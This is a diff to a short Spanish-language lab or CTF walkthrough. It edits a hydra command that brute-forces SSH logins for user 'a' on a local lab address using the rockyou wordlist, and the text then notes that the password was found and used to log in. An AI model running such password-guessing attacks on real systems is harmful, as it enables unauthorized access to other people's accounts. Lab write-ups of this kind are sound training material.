@@ -17,7 +17,7 @@ Accedemos a la página web alojada en esta máquina utilizando un navegador y ve
 
 Usamos hydra.
 
-hydra -l "a" -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 64 -I
+hydra -l "a" -P /home/ankb/Documents/rockyou.txt ssh://172.17.0.2 
 
 Encontramos la contrasena para el usuario y enctramos por ssh.
 
